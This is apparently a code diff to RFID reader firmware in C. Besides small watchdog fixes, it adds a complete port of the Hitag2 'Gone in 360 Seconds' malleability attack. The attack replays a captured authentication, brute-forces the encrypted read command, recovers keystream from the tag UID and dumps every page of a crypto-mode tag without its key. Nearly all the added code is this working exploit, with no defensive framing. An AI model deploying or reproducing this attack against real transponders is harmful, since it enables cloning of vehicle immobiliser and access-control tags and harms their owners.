@@ -6,6 +6,7 @@
 #include "app_timer.h"
 #include "bsp_delay.h"
 #include "bsp_time.h"
+#include "bsp_wdt.h"
 #include "circular_buffer.h"
 #include "hitag2_crypto.h"
 #include "lf_125khz_radio.h"
@@ -733,6 +734,7 @@ static bool hitag2_read_verified(hitag2_session_t session, const uint8_t *secret
 
     g_fail_stage = HITAG2_FAIL_NONE;
     for (g_attempts = 1; g_attempts <= HITAG2_SESSION_ATTEMPTS; g_attempts++) {
+        bsp_wdt_feed();  /* a silent tag times out each attempt; 12 can exceed the 5 s watchdog */
         uint8_t stage = session(secret, pages, timeout_ms);
         if (stage == HITAG2_FAIL_NONE) {
             for (uint8_t i = 0; i < n_prev && i < HITAG2_KEEP; i++) {
@@ -769,4 +771,242 @@ bool hitag2_reader_crypto_read(const uint8_t key[HITAG2_KEY_SIZE],
                                 uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
                                 uint32_t timeout_ms) {
     return hitag2_read_verified(hitag2_crypto_read_session, key, pages, timeout_ms);
+}
+
+/* -----------------------------------------------------------------------
+ * Malleability crack (key-agnostic). Ported from the "Gone in 360 Seconds"
+ * attack as implemented in RfidResearchGroup/proxmark3 armsrc/hitag2_crack.c
+ * (ht2_crack1), itself from AdamLaurie/RFIDler. No cipher is run here: the
+ * tag issues no challenge, so a captured {nR}{aR} is replayed to authenticate,
+ * the read-page-0 command is found by brute force, and keystream is recovered
+ * from the id, which is known plaintext (sent in clear during auth). This
+ * reads a crypto-mode tag whose key is unknown. Needs one valid {nR}{aR}.
+ *
+ * Every command here is <=64 bits, so the existing <=64-bit TX path is reused
+ * as is. Each e-cmd cold-starts its own power-up, as the read sessions do, to
+ * avoid the field-held timeslot reset seen on this hardware.
+ * --------------------------------------------------------------------- */
+
+/* "1100000111" -- read page 0, as a binarray (one bit per byte). */
+static const uint8_t hitag2_read_p0_cmd[10] = {1, 1, 0, 0, 0, 0, 0, 1, 1, 1};
+
+static void hitag2_crack_xor(uint8_t *dst, const uint8_t *a, const uint8_t *b, size_t n) {
+    for (size_t i = 0; i < n; i++) {
+        dst[i] = a[i] ^ b[i];
+    }
+}
+
+/* MSB-first, matching hitag2_send_bits_bytes / hitag2_receive_frame packing. */
+static void hitag2_crack_bits_to_bytes(const uint8_t *bits, uint8_t nbits, uint8_t *bytes) {
+    memset(bytes, 0, (size_t)(nbits + 7) / 8);
+    for (uint8_t i = 0; i < nbits; i++) {
+        bytes[i / 8] |= (uint8_t)((bits[i] & 1u) << (7 - (i % 8)));
+    }
+}
+
+static void hitag2_crack_bytes_to_bits(const uint8_t *bytes, uint8_t nbits, uint8_t *bits) {
+    for (uint8_t i = 0; i < nbits; i++) {
+        bits[i] = (bytes[i / 8] >> (7 - (i % 8))) & 1u;
+    }
+}
+
+/* Cold-start replay: START_AUTH -> id, nrar -> (ignored page 3), e-cmd -> resp.
+ * resp_bits gets the 32-bit response as a binarray; true only on a 32-bit reply. */
+static bool hitag2_crack_send_e_cmd(uint8_t *resp_bits, const uint8_t *nrar_bits,
+                                    const uint8_t *cmd_bits, uint8_t len, uint32_t timeout_ms) {
+    uint8_t uid[4];
+    if (!hitag2_reader_get_uid(uid, timeout_ms)) {
+        stop_lf_125khz_radio();
+        hitag2_hfclk_release();
+        return false;
+    }
+
+    uint8_t nrar_bytes[8];
+    hitag2_crack_bits_to_bytes(nrar_bits, 64, nrar_bytes);
+    uint8_t ignore[4];
+    if (!hitag2_tx_rx_bytes(nrar_bytes, 64, ignore, 32, 0, timeout_ms)) {
+        stop_lf_125khz_radio();
+        hitag2_hfclk_release();
+        return false;
+    }
+
+    uint8_t cmd_bytes[8];
+    hitag2_crack_bits_to_bytes(cmd_bits, len, cmd_bytes);
+    uint8_t resp_bytes[4];
+    bool ok = hitag2_tx_rx_bytes(cmd_bytes, len, resp_bytes, 32, 0, timeout_ms);
+    stop_lf_125khz_radio();
+    hitag2_hfclk_release();
+    if (!ok) {
+        return false;
+    }
+    hitag2_crack_bytes_to_bits(resp_bytes, 32, resp_bits);
+    return true;
+}
+
+/* The CU-vs-CU link drops reply bits and Hitag2 replies carry no checksum, so a
+ * single read can be wrong. Read until two of up to HT2_CRACK_TRIES reads agree,
+ * same tactic as the password/crypto reader. resp_bits gets the agreed response. */
+#define HT2_CRACK_TRIES  8
+#define HT2_CRACK_KEEP   4
+static bool hitag2_crack_read_verified(uint8_t *resp_bits, const uint8_t *nrar,
+                                       const uint8_t *cmd_bits, uint8_t len, uint32_t timeout_ms) {
+    uint8_t seen[HT2_CRACK_KEEP][32];
+    uint8_t n_seen = 0;
+    for (uint8_t t = 0; t < HT2_CRACK_TRIES; t++) {
+        bsp_wdt_feed();
+        uint8_t r[32];
+        if (hitag2_crack_send_e_cmd(r, nrar, cmd_bits, len, timeout_ms)) {
+            for (uint8_t i = 0; i < n_seen; i++) {
+                if (memcmp(seen[i], r, 32) == 0) {
+                    memcpy(resp_bits, r, 32);
+                    return true;
+                }
+            }
+            if (n_seen < HT2_CRACK_KEEP) {
+                memcpy(seen[n_seen++], r, 32);
+            }
+        }
+        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
+    }
+    return false;
+}
+
+/* Hold bits 5,7,8,9 at 0 and sweep the other six until one e-cmd is answered. */
+static bool hitag2_crack_find_valid_e_cmd(uint8_t *e_cmd, const uint8_t *nrar, uint32_t timeout_ms) {
+    for (uint8_t a = 0; a < 2; a++)
+    for (uint8_t b = 0; b < 2; b++)
+    for (uint8_t c = 0; c < 2; c++)
+    for (uint8_t d = 0; d < 2; d++)
+    for (uint8_t e = 0; e < 2; e++)
+    for (uint8_t g = 0; g < 2; g++) {
+        bsp_wdt_feed();  /* the full sweep can outlast the 5 s watchdog */
+        uint8_t guess[10] = { a, b, c, d, e, 0, g, 0, 0, 0 };
+        uint8_t resp[32];
+        if (hitag2_crack_send_e_cmd(resp, nrar, guess, 10, timeout_ms)) {
+            memcpy(e_cmd, guess, 10);
+            return true;
+        }
+        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
+    }
+    return false;
+}
+
+/* Recover 42 keystream bits from the known id, then confirm with a 40-bit
+ * extended read-page-0 (4x the command): a 32-bit reply means the stream is right. */
+static bool hitag2_crack_test_e_p0cmd(uint8_t *keybits, const uint8_t *nrar,
+                                      const uint8_t *e_cmd, const uint8_t *uid,
+                                      const uint8_t *e_uid, uint32_t timeout_ms) {
+    uint8_t cipher[42];
+    memcpy(cipher, e_cmd, 10);
+    memcpy(cipher + 10, e_uid, 32);
+
+    uint8_t plain[42];
+    memcpy(plain, hitag2_read_p0_cmd, 10);
+    memcpy(plain + 10, uid, 32);
+
+    hitag2_crack_xor(keybits, plain, cipher, 42);
+
+    uint8_t e_ext[40];
+    for (uint8_t i = 0; i < 4; i++) {
+        hitag2_crack_xor(e_ext + i * 10, hitag2_read_p0_cmd, keybits + i * 10, 10);
+    }
+    /* Any 32-bit reply confirms the keystream; retry so link noise does not
+     * discard the right candidate. */
+    uint8_t resp[32];
+    for (uint8_t t = 0; t < HT2_CRACK_TRIES; t++) {
+        bsp_wdt_feed();
+        if (hitag2_crack_send_e_cmd(resp, nrar, e_ext, 40, timeout_ms)) {
+            return true;
+        }
+        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
+    }
+    return false;
+}
+
+/* From the first valid e-cmd, sweep the inverted + 3 page bits (both halves)
+ * to find the read-page-0 command and its keystream. */
+static bool hitag2_crack_find_e_page0(uint8_t *keybits, const uint8_t *e_first,
+                                      const uint8_t *nrar, const uint8_t *uid, uint32_t timeout_ms) {
+    for (uint8_t a = 0; a < 2; a++)
+    for (uint8_t b = 0; b < 2; b++)
+    for (uint8_t c = 0; c < 2; c++)
+    for (uint8_t d = 0; d < 2; d++) {
+        bsp_wdt_feed();
+        uint8_t guess[10];
+        memcpy(guess, e_first, 10);
+        if (a) { guess[5] = !guess[5]; guess[0] = !guess[0]; }
+        if (b) { guess[7] = !guess[7]; guess[2] = !guess[2]; }
+        if (c) { guess[8] = !guess[8]; guess[3] = !guess[3]; }
+        if (d) { guess[9] = !guess[9]; guess[4] = !guess[4]; }
+
+        uint8_t e_uid[32];
+        if (hitag2_crack_read_verified(e_uid, nrar, guess, 10, timeout_ms)) {
+            if (hitag2_crack_test_e_p0cmd(keybits, nrar, guess, uid, e_uid, timeout_ms)) {
+                return true;
+            }
+        }
+        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
+    }
+    return false;
+}
+
+/* Read one page with the recovered keystream: encrypt the page command,
+ * decrypt the 32-bit reply. page_out gets 4 bytes; false on no answer. */
+static bool hitag2_crack_read_page(uint8_t *page_out, uint8_t page, const uint8_t *nrar,
+                                   const uint8_t *keybits, uint32_t timeout_ms) {
+    uint8_t cmd[10];
+    memcpy(cmd, hitag2_read_p0_cmd, 10);
+    if (page & 0x1) { cmd[9] = !cmd[9]; cmd[4] = !cmd[4]; }
+    if (page & 0x2) { cmd[8] = !cmd[8]; cmd[3] = !cmd[3]; }
+    if (page & 0x4) { cmd[7] = !cmd[7]; cmd[2] = !cmd[2]; }
+
+    uint8_t e_cmd[10];
+    hitag2_crack_xor(e_cmd, cmd, keybits, 10);
+
+    uint8_t e_resp[32];
+    if (!hitag2_crack_read_verified(e_resp, nrar, e_cmd, 10, timeout_ms)) {
+        return false;
+    }
+    uint8_t resp[32];
+    hitag2_crack_xor(resp, e_resp, keybits + 10, 32);
+    hitag2_crack_bits_to_bytes(resp, 32, page_out);
+    return true;
+}
+
+uint8_t hitag2_reader_crack(const uint8_t nrar[8],
+                            uint8_t pages[HITAG2_NUM_PAGES][HITAG2_PAGE_SIZE],
+                            uint32_t timeout_ms) {
+    memset(pages, 0, HITAG2_NUM_PAGES * HITAG2_PAGE_SIZE);
+
+    uint8_t uid_bytes[4];
+    if (!hitag2_reader_get_uid(uid_bytes, timeout_ms)) {
+        stop_lf_125khz_radio();
+        hitag2_hfclk_release();
+        return HITAG2_CRACK_NO_UID;
+    }
+    stop_lf_125khz_radio();
+    hitag2_hfclk_release();
+    memcpy(pages[HITAG2_PAGE_UID], uid_bytes, 4);
+
+    uint8_t nrar_bits[64];
+    hitag2_crack_bytes_to_bits(nrar, 64, nrar_bits);
+    uint8_t uid_bits[32];
+    hitag2_crack_bytes_to_bits(uid_bytes, 32, uid_bits);
+
+    uint8_t e_first[10];
+    if (!hitag2_crack_find_valid_e_cmd(e_first, nrar_bits, timeout_ms)) {
+        return HITAG2_CRACK_NO_ECMD;
+    }
+
+    uint8_t keybits[42];
+    if (!hitag2_crack_find_e_page0(keybits, e_first, nrar_bits, uid_bits, timeout_ms)) {
+        return HITAG2_CRACK_NO_PAGE0;
+    }
+
+    for (uint8_t page = 1; page < HITAG2_NUM_PAGES; page++) {
+        bsp_wdt_feed();
+        hitag2_crack_read_page(pages[page], page, nrar_bits, keybits, timeout_ms);
+        bsp_delay_ms(HITAG2_FIELD_OFF_MS);
+    }
+    return HITAG2_CRACK_OK;
 }
